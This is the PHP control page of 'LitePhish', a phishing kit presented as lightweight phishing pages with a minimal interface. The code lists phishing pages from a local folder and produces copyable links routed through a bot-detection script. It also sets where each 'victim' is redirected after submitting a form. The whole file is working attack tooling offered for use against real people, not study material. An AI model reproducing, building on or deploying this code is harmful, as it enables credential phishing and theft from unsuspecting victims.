<?php
echo '
<script src="modules/script.js"></script>
<link rel="stylesheet" href="modules/style.css">
<center>	
<title>LitePhish</title>
<a style=font-size:20px href=>LitePhish - written from scratch</a><br>
<p><a href=http://github.com/DarkSecDevelopers/LitePhish target=_blank>LitePhish</a> provides lite weight phishing pages with clean and minimal interface. <br>
It is modified and lite version of <a href=http://www.github.com/graysuit/grayfish target=_blank>grayfish</a>.
When victim submit form, <br>he/she would be redirected towards the url you specified in input below.<br>
When textarea is focused, it will automatically copies the link to clipboard.<br>
You can also click on the page name to check the link.
</p>
<br><br>
<input oninput=UpdateRedirects(this.id) placeholder="Redirect victim to ? http://example.com" id="redirect">
<br><br><br>';

$Current_Url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";  //https://stackoverflow.com/a/6768831/11390822
$SiteIndex = 1;
foreach(scandir('./websites') as $file) 
{
	if (!is_dir('./websites/'.$file)) 
	{
		echo "<a target=_blank href='./modules/detect_bot.php?filename=$file'>".$SiteIndex.") ".$file."</a><br>";
		echo "<textarea onclick='Copy(this.id);' id='textarea_$file'>".$Current_Url."./modules/detect_bot.php?filename=".$file."</textarea>";
		echo "<br><br><br>";
		$SiteIndex += 1;
	}
}


?>